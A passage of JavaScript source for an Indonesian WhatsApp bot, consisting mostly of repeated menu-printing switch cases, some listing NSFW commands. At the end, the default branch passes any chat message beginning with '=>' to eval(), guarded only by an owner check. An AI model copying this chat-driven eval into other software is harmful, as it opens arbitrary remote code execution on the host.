│⭔ ${prefix}bisakah
│⭔ ${prefix}bagaimanakah
│⭔ ${prefix}rate
│⭔ ${prefix}kapankah
│⭔ ${prefix}cekganteng
│⭔ ${prefix}cekcantik
│⭔ ${prefix}ceksange
│⭔ ${prefix}cekgay
│⭔ ${prefix}ceklesbi
│⭔ ${prefix}cekmati
│⭔ ${prefix}wangy
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
└───────⭓

┌──⭓ *PRIMBON MENU*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│⭔ ${prefix}shio
│
└───────⭓

┌──⭓ *CONVERT MENU*
│
│⭔ ${prefix}attp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}sticker
│⭔ ${prefix}stext
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│
└───────⭓

┌──⭓ *MAIN MENU*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}runtime
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│
└───────⭓

┌──⭓ *DATABASE MENU*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
└───────⭓

┌──⭓ *ANONYMOUS MENU*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│⭔ ${prefix}sendkontak
│
└───────⭓

┌──⭓ *ISLAMIC MENU*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
└───────⭓

┌──⭓ *VOICE CHANGER*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
└───────⭓

┌──⭓ *OWNER MENU*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: ''
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'NelzBotz', global.thumb, btn)
                     }
            break

            case 'groupmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *GROUP MENU*
│
│⭔ ${prefix}linkgroup
│⭔ ${prefix}ephemeral [option]
│⭔ ${prefix}setppgc [image]
│⭔ ${prefix}setname [text]
│⭔ ${prefix}setdesc [text]
│⭔ ${prefix}group [option]
│⭔ ${prefix}editinfo [option]
│⭔ ${prefix}add @user
│⭔ ${prefix}kick @user
│⭔ ${prefix}hidetag [text]
│⭔ ${prefix}tagall [text]
│⭔ ${prefix}antilink [on/off]
│⭔ ${prefix}mute [on/off]
│⭔ ${prefix}promote @user
│⭔ ${prefix}demote @user
│⭔ ${prefix}vote [text]
│⭔ ${prefix}devote
│⭔ ${prefix}upvote
│⭔ ${prefix}cekvote
│⭔ ${prefix}hapusvote
│
└───────⭓`
                let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'downloadmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *DOWNLOAD MENU*
│
│⭔ ${prefix}tiktoknowm [url]
│⭔ ${prefix}tiktokwm [url]
│⭔ ${prefix}tiktokmp3 [url]
│⭔ ${prefix}instagram [url]
│⭔ ${prefix}twitter [url]
│⭔ ${prefix}twittermp3 [url]
│⭔ ${prefix}facebook [url]
│⭔ ${prefix}pinterestdl [url]
│⭔ ${prefix}ytmp3 [url]
│⭔ ${prefix}ytmp4 [url]
│⭔ ${prefix}getmusic [query]
│⭔ ${prefix}getvideo [query]
│⭔ ${prefix}umma [url]
│⭔ ${prefix}joox [query]
│⭔ ${prefix}soundcloud [url]
│
└───────⭓`
         let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'searchmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *SEARCH MENU*
│
│⭔ ${prefix}play [query]
│⭔ ${prefix}yts [query]
│⭔ ${prefix}google [query]
│⭔ ${prefix}gimage [query]
│⭔ ${prefix}pinterest [query]
│⭔ ${prefix}wallpaper [query]
│⭔ ${prefix}wikimedia [query]
│⭔ ${prefix}ytsearch [query]
│⭔ ${prefix}ringtone [query]
│⭔ ${prefix}stalk [option] [query]
│
└───────⭓`
       let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'mememenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *MEME MENU*
│
│⭔ ${prefix}meme
│⭔ ${prefix}memeindo
│⭔ ${prefix}darkjokes
│⭔ ${prefix}darkmeme
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER??',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'randommenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *RANDOM MENU*
│
│⭔ ${prefix}coffe
│⭔ ${prefix}quotesanime
│⭔ ${prefix}motivasi
│⭔ ${prefix}dilanquote
│⭔ ${prefix}bucinquote
│⭔ ${prefix}katasenja
│⭔ ${prefix}puisi
│⭔ ${prefix}couple
│⭔ ${prefix}anime
│⭔ ${prefix}waifu
│⭔ ${prefix}husbu
│⭔ ${prefix}neko
│⭔ ${prefix}shinobu
│⭔ ${prefix}waifus (nsfw)
│⭔ ${prefix}nekos (nsfw)
│⭔ ${prefix}trap (nsfw)
│⭔ ${prefix}blowjob (nsfw)
│
└───────⭓`
       let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER??',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'Afabotz', global.thumb, btn)
                     }
            break


case 'textpromenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *TEXT PRO MENU*
│
│⭔ ${prefix}3dchristmas
│⭔ ${prefix}3ddeepsea
│⭔ ${prefix}americanflag
│⭔ ${prefix}3dscifi
│⭔ ${prefix}3drainbow
│⭔ ${prefix}3dwaterpipe
│⭔ ${prefix}halloweenskeleton
│⭔ ${prefix}sketch
│⭔ ${prefix}bluecircuit
│⭔ ${prefix}space
│⭔ ${prefix}metallic
│⭔ ${prefix}fiction
│⭔ ${prefix}greenhorror
│⭔ ${prefix}transformer
│⭔ ${prefix}berry
│⭔ ${prefix}thunder
│⭔ ${prefix}magma
│⭔ ${prefix}3dcrackedstone
│⭔ ${prefix}3dneonlight
│⭔ ${prefix}impressiveglitch
│⭔ ${prefix}naturalleaves
│⭔ ${prefix}fireworksparkle
│⭔ ${prefix}matrix
│⭔ ${prefix}dropwater
│⭔ ${prefix}harrypotter
│⭔ ${prefix}foggywindow
│⭔ ${prefix}neondevils
│⭔ ${prefix}christmasholiday
│⭔ ${prefix}3dgradient
│⭔ ${prefix}blackpink
│⭔ ${prefix}gluetext
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'photooxymenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *PHOTO OXY MENU*
│
│⭔ ${prefix}shadow
│⭔ ${prefix}romantic
│⭔ ${prefix}smoke
│⭔ ${prefix}burnpapper
│⭔ ${prefix}naruto
│⭔ ${prefix}lovemsg
│⭔ ${prefix}grassmsg
│⭔ ${prefix}lovetext
│⭔ ${prefix}coffecup
│⭔ ${prefix}butterfly
│⭔ ${prefix}harrypotter
│⭔ ${prefix}retrolol
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'ephotomenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *EPHOTO MENU*
│
│⭔ ${prefix}ffcover
│⭔ ${prefix}crossfire
│⭔ ${prefix}galaxy
│⭔ ${prefix}glass
│⭔ ${prefix}neon
│⭔ ${prefix}beach
│⭔ ${prefix}blackpink
│⭔ ${prefix}igcertificate
│⭔ ${prefix}ytcertificate
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'funmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *FUN MENU*
│
│⭔ ${prefix}apakah
│⭔ ${prefix}bisakah
│⭔ ${prefix}bagaimanakah
│⭔ ${prefix}rate
│⭔ ${prefix}kapankah
│⭔ ${prefix}cekganteng
│⭔ ${prefix}cekcantik
│⭔ ${prefix}ceksange
│⭔ ${prefix}cekgay
│⭔ ${prefix}ceklesbi
│⭔ ${prefix}cekmati
│⭔ ${prefix}wangy
│⭔ ${prefix}halah
│⭔ ${prefix}hilih
│⭔ ${prefix}huluh
│⭔ ${prefix}heleh
│⭔ ${prefix}holoh
│⭔ ${prefix}jadian
│⭔ ${prefix}jodohku
│⭔ ${prefix}delttt
│⭔ ${prefix}tictactoe
│⭔ ${prefix}family100
│⭔ ${prefix}tebak [option]
│⭔ ${prefix}math [mode]
│⭔ ${prefix}suitpvp [@tag]
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/8'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'primbonmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *PRIMBON MENU*
│
│⭔ ${prefix}nomorhoki
│⭔ ${prefix}artimimpi
│⭔ ${prefix}artinama
│⭔ ${prefix}ramaljodoh
│⭔ ${prefix}ramaljodohbali
│⭔ ${prefix}suamiistri
│⭔ ${prefix}ramalcinta
│⭔ ${prefix}cocoknama
│⭔ ${prefix}pasangan
│⭔ ${prefix}jadiannikah
│⭔ ${prefix}sifatusaha
│⭔ ${prefix}rezeki
│⭔ ${prefix}pekerjaan
│⭔ ${prefix}nasib
│⭔ ${prefix}penyakit
│⭔ ${prefix}tarot
│⭔ ${prefix}fengshui
│⭔ ${prefix}haribaik
│⭔ ${prefix}harisangar
│⭔ ${prefix}harisial
│⭔ ${prefix}nagahari
│⭔ ${prefix}arahrezeki
│⭔ ${prefix}peruntungan
│⭔ ${prefix}weton
│⭔ ${prefix}karakter
│⭔ ${prefix}keberuntungan
│⭔ ${prefix}memancing
│⭔ ${prefix}masasubur
│⭔ ${prefix}zodiak
│⭔ ${prefix}shio
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'convertmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *CONVERT MENU*
│
│⭔ ${prefix}attp
│⭔ ${prefix}toimage
│⭔ ${prefix}removebg
│⭔ ${prefix}stext
│⭔ ${prefix}sticker
│⭔ ${prefix}emojimix
│⭔ ${prefix}emojimix2
│⭔ ${prefix}tovideo
│⭔ ${prefix}togif
│⭔ ${prefix}tourl
│⭔ ${prefix}tovn
│⭔ ${prefix}tomp3
│⭔ ${prefix}toaudio
│⭔ ${prefix}ebinary
│⭔ ${prefix}dbinary
│⭔ ${prefix}styletext
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'mainmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *MAIN MENU*
│
│⭔ ${prefix}ping
│⭔ ${prefix}owner
│⭔ ${prefix}runtime
│⭔ ${prefix}menu / ${prefix}help / ${prefix}?
│⭔ ${prefix}delete
│⭔ ${prefix}infochat
│⭔ ${prefix}quoted
│⭔ ${prefix}listpc
│⭔ ${prefix}listgc
│⭔ ${prefix}listonline
│⭔ ${prefix}speedtest
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'databasemenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *DATABASE MENU*
│
│⭔ ${prefix}setcmd
│⭔ ${prefix}listcmd
│⭔ ${prefix}delcmd
│⭔ ${prefix}lockcmd
│⭔ ${prefix}addmsg
│⭔ ${prefix}listmsg
│⭔ ${prefix}getmsg
│⭔ ${prefix}delmsg
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'anonymousmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *ANONYMOUS MENU*
│
│⭔ ${prefix}anonymous
│⭔ ${prefix}start
│⭔ ${prefix}next
│⭔ ${prefix}keluar
│⭔ ${prefix}sendkontak
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'islamicmenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *ISLAMIC MENU*
│
│⭔ ${prefix}iqra
│⭔ ${prefix}hadist
│⭔ ${prefix}alquran
│⭔ ${prefix}juzamma
│⭔ ${prefix}tafsirsurah
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'voicechangermenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *VOICE CHANGER*
│
│⭔ ${prefix}bass
│⭔ ${prefix}blown
│⭔ ${prefix}deep
│⭔ ${prefix}earrape
│⭔ ${prefix}fast
│⭔ ${prefix}fat
│⭔ ${prefix}nightcore
│⭔ ${prefix}reverse
│⭔ ${prefix}robot
│⭔ ${prefix}slow
│⭔ ${prefix}tupai
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'ownermenu': {
                anu = `Hai Kak ${pushname}
                
┌──⭓ 「 INFO BOT 」⭓
│
│ Prefix : ( ${prefix} )
│ Name : ${global.namabot}\n│ Owner : ${global.namaowner}
│ Mode : ${hisoka.public ? 'Public' : 'Self'}
│ Runtime : ${runtime(process.uptime())}
│ Lib : Baileys Multi Device
│
└───────⭓

┌──⭓ *OWNER MENU*
│
│⭔ ${prefix}react [emoji]
│⭔ ${prefix}chat [option]
│⭔ ${prefix}join [link]
│⭔ ${prefix}leave
│⭔ ${prefix}block @user
│⭔ ${prefix}unblock @user
│⭔ ${prefix}bcgroup [text]
│⭔ ${prefix}bcall [text]
│⭔ ${prefix}setppbot [image]
│⭔ ${prefix}setexif
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break

case 'thanksto': {
                anu = `Hai Kak ${pushname}

┌──⭓ *THANKS TO*
│
│⭔ Allah Swt
│⭔ Ortu Saya
│⭔ Dika Ardnt (Pemilik Base)
│⭔ GuaAbuzz
│⭔ Fandy
│⭔ Daffa
│⭔ Penyedia Module
│⭔ Penyedia Rest Api
│
└───────⭓`
let btn = [{
                                urlButton: {
                                    displayText: 'YT CREATOR📽️',
                                    url: 'https://youtube.com/'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'RULES❗',
                                    id: 'rules'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'OWNER👤',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'LIST MENU📚',
                                    id: 'command'
                                }
                            }]
                        hisoka.send5ButImg(m.chat, anu, 'AfaBotz', global.thumb, btn)
                     }
            break
            default:
                if (budy.startsWith('=>')) {
                    if (!isCreator) return m.reply(mess.owner)
                    function Return(sul) {
                        sat = JSON.stringify(sul, null, 2)
                        bang = util.format(sat)
                            if (sat == undefined) {
                                bang = util.format(sul)
                            }
                            return m.reply(bang)
                    }
                    try {
                        m.reply(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
